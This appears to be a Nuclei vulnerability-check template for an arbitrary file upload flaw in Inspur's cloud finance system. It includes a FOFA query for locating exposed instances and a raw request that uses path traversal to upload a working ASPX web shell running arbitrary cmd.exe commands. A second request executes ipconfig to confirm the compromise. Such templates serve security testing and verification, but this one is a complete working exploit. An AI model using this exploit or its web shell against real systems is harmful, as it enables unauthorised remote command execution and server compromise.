id: inspur-UploadListFile-fileupload
info:
  name: 浪潮云财务系统 UploadListFile - fileupload
  author: leadlife
  severity: critical
  description: 浪潮云财务系统UploadListFile存在任意文件上传漏洞，允许攻击者上传恶意文件到服务器，可能导致远程代码执行、网站篡改或其他形式的攻击，严重威胁系统和数据安全。
  reference: 
    - https://github.com/wy876/POC/blob/main/%E6%B5%AA%E6%BD%AE%E4%BA%91/%E6%B5%AA%E6%BD%AE%E4%BA%91%E8%B4%A2%E5%8A%A1%E7%B3%BB%E7%BB%9FUploadListFile%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: app="Inspur-GS企业管理" || title="TSCEV4.0" || body="cwbase/web/scripts/aes.js" || body="/cwbase/web/scripts/jquery.js" || body="ClusterEngine V4.0" || icon_hash="-1341069524"
  tags: 2024,fileupload,inspur

variables:
    filename: "{{to_lower(rand_base(4))}}"
    date: '{{date_time("%Y/%M/%D")}}'

http:
  - raw:
      - |
        POST /cwbase/EP/ListContent/UploadListFile.ashx?uptype=attslib&keyid=1&key1=1&key2=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
        Accept: /
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Connection: close
        Content-Type: multipart/form-data; boundary=---------------------------rww5upkbw6ctf0tu5hye
        
        -----------------------------rww5upkbw6ctf0tu5hye
        Content-Disposition: form-data; name="file"; filename="../../../../../../{{filename}}.aspx"
        Content-Type: image/png
        
        <%@ Page Language="Jscript" validateRequest="false" %>
        <%
        var c=new System.Diagnostics.ProcessStartInfo("cmd");
        var e=new System.Diagnostics.Process();
        var out:System.IO.StreamReader,EI:System.IO.StreamReader;
        c.UseShellExecute=false;
        c.RedirectStandardOutput=true;
        c.RedirectStandardError=true;
        e.StartInfo=c;
        c.Arguments="/c " + Request.Item["cmd"];
        e.Start();
        out=e.StandardOutput;
        EI=e.StandardError;
        e.Close();
        Response.Write(out.ReadToEnd() + EI.ReadToEnd());
        System.IO.File.Delete(Request.PhysicalPath);
        Response.End();%>
        -----------------------------rww5upkbw6ctf0tu5hye--
      
      - |+
        GET /cwbase/{{filename}}.aspx?cmd=ipconfig HTTP/1.1
        Host: {{Hostname}}
        

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "Windows IP"

      - type: status
        status:
          - 200
